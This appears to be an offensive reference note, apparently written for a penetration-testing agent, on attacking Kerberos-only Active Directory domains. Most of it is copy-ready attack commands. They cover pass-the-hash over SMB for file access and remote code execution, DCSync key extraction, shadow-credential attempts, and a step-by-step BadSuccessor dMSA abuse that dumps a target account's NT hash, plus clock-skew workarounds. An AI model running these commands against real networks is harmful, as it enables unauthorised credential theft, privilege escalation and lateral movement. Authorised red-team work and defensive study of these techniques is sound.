# Kerberos-Only Environments & BadSuccessor

Load this reference when:
- NTLM authentication is rejected for LDAP (but SMB still works)
- `getTGT` fails with `KDC_ERR_ETYPE_NOSUPP` even with a valid hash
- You need to abuse dMSA (delegated MSA) via BadSuccessor
- Shadow credentials fail with `KDC_ERR_PADATA_TYPE_NOSUPP`

---

## Identifying a Kerberos-only environment

| Signal | Meaning |
|--------|---------|
| `impacket-smbclient` connects with PtH but `ldap3` bind returns `strongerAuthRequired` | NTLM disabled for LDAP only; SMB still accepts NTLM |
| `getTGT -hashes :NTHASH` → `KDC_ERR_ETYPE_NOSUPP` | RC4 disabled domain-wide; AES-only AS-REQ |
| `bloodyAD -k` → `Clock skew detected. Adjusting...` then succeeds | Kerberos in use; bloodyAD handles skew automatically |
| `certipy find` → empty Enrollment Services | No AD CS — Shadow Credentials / PKINIT is a dead end |

---

## Critical bypass: NTLM PtH on SMB still works

Even when NTLM is disabled for LDAP and Kerberos RC4 is banned for TGT requests, **NTLM pass-the-hash works on SMB (port 445)**. This enables both file access and code execution despite a fully Kerberos-controlled LDAP/auth environment.

```bash
# SMB access with NT hash — works even when getTGT -hashes fails
impacket-smbclient -hashes :NTHASH DOMAIN/user@<target_ip>
smbclient //target/share -U 'DOMAIN\user%NTHASH' --pw-nt-hash   # native samba client

# Code execution with NT hash
impacket-wmiexec -hashes :NTHASH DOMAIN/user@<target_ip>
impacket-psexec -hashes :NTHASH DOMAIN/user@<target_ip>
```

Use this to reach shares (SMB) or execute code when Kerberos auth is blocked by etype/skew/LDAP restrictions.

---

## AES-only TGT requests

When RC4 is disabled, `getTGT -hashes :NTHASH` fails. You need the account's AES256 key.

```bash
# Requires AES256 key (obtainable from secretsdump DCSync or dMSA key package)
impacket-getTGT DOMAIN/user -aesKey <aes256_key_hex> -dc-ip <DC_IP>
export KRB5CCNAME=user.ccache
```

AES256 keys are stable across password resets only if the password itself hasn't changed. Obtain them via DCSync (`secretsdump -just-dc-user <user>`) or from memory.

---

## Clock skew — tool matrix

Kerberos rejects auth if client clock differs >5 min from DC. Different tools handle this differently.

| Tool | Clock skew behavior | Fix when needed |
|------|---------------------|-----------------|
| bloodyAD | **Auto-corrects** ("Clock skew detected. Adjusting...") | None needed |
| kerbad (badS4U2self, badTGT) | Does NOT always auto-correct | `sudo date -u -s "<DC_time>"` inline, just before running |
| impacket scripts | Does NOT auto-correct | `faketime '+Xh' command` or `sudo ntpdate -u <DC_IP>` |
| Rubeus (Windows) | Uses Windows system clock | `w32tm /resync /force` or `net time /set` |

Get DC time: `nmap -p 445 --script smb2-time <DC_IP>` or from any SMB error timestamp.

For impacket without root/faketime: write a datetime monkeypatch shim that offsets `datetime.datetime.utcnow()` by the measured skew before importing impacket modules.

---

## Shadow Credentials — PKINIT dead-end detection

Shadow credentials (injecting `msDS-KeyCredentialLink`) require **PKINIT** to authenticate. PKINIT requires either:
- Active Directory Certificate Services (AD CS) with a KDC Authentication certificate, OR
- The DC to have a KDC certificate from any trusted source

**Dead-end signal**: `KDC_ERR_PADATA_TYPE_NOSUPP` after injecting `msDS-KeyCredentialLink` means PKINIT is not supported — the DC has no KDC certificate. Abandon shadow credentials; pivot to another path.

```bash
# Detect before wasting time:
certipy find -u user@domain -p pass -dc-ip <DC_IP> -stdout
# If "Enrollment Services: (empty)" → no AD CS → PKINIT is dead

# badNTPKInit from kerbad also surfaces this quickly:
badNTPKInit "kerberos+ccache://domain\user:user.ccache@<DC_IP>" "user@DOMAIN" cert.pfx
# KDC_ERR_PADATA_TYPE_NOSUPP → abandon
```

Alternative when shadow credentials fail: BadSuccessor (if CREATE_CHILD on OU available) or RBCD.

---

## BadSuccessor (dMSA abuse)

**Prerequisite**: CREATE_CHILD right on an OU (to create the dMSA object).

**Mechanism**: Create a delegated MSA (`dMSA`) with `msDS-DelegatedMSAState=2` and link it to a target account. The KDC issues a key package containing the target's RC4 (NT) hash when S4U2self is requested for the dMSA. This bypasses needing the target's password or AES key.

**Post-patch requirement**: Also requires a WRITE right on the target account (to set `msDS-SupersededManagedAccountLink` and `msDS-SupersededServiceAccountState`). These two rights (CREATE_CHILD on OU and WRITE on target) can be held by **different principals**.

```bash
# Single actor (holds both CREATE_CHILD on OU and WRITE on target):
bloodyAD --host <DC_IP> -d <domain> -u <username> -k \
  add badSuccessor <dmsa_name> \
  -t "CN=<target>,OU=<ou>,DC=<domain>,DC=<tld>" \
  --ou "OU=<ou>,DC=<domain>,DC=<tld>"
# bloodyAD handles both attribute writes + S4U2self automatically; prints RC4 hash

# Split-identity (Actor A = CREATE_CHILD on OU; Actor B = WRITE on target):

# Step 1 — Actor A: create dMSA only (skip writing msDS-Superseded* on target)
bloodyAD --host <DC_IP> -d <domain> -u <actor_a> -k \
  add badSuccessor <dmsa_name> \
  -t "CN=<target>,OU=<ou>,DC=<domain>,DC=<tld>" \
  --ou "OU=<ou>,DC=<domain>,DC=<tld>" \
  --prepatch

# Step 2 — Actor B: write reciprocal attributes on target (GenericWrite is sufficient)
# Via PowerShell on a shell as Actor B (Negotiate+Sealing satisfies LDAP sealing):
$dm = [adsi]"LDAP://CN=<target>,OU=<ou>,DC=<domain>,DC=<tld>"
$dm.Properties["msDS-SupersededManagedAccountLink"].Value = "CN=<dmsa_name>,OU=<ou>,DC=<domain>,DC=<tld>"
$dm.Properties["msDS-SupersededServiceAccountState"].Value = 2
$dm.CommitChanges()

# Step 3 — Actor A: extract target's NT hash via S4U2self
sudo date -u -s "<DC_time>"   # clock skew — badS4U2self does not auto-correct
badS4U2self \
  "kerberos+ccache://domain\<actor_a>:<actor_a>.ccache@<DC_IP>" \
  "krbtgt/<DOMAIN>@<DOMAIN>" \
  "<dmsa_name>\$@<DOMAIN>" \
  --dmsa
# Output: target account NT/RC4 hash
```

**Key limits**:
- The dMSA key package yields only the **RC4 (NT) hash** of the superseded account — no AES keys.
- If AES-only Kerberos is enforced, use the NT hash for NTLM PtH (SMB/WMI), not for TGT requests.
- The dMSA object lives in the OU; clean it up after use.

**Tooling**: `badS4U2self` is in the `bloodyad` pipx venv (`~/.local/share/pipx/venvs/bloodyad/bin/`). It uses Kerberos and needs a valid ccache for Actor A. See `offensive-tools/windows/bloodyad/` for full bloodyAD auth patterns.
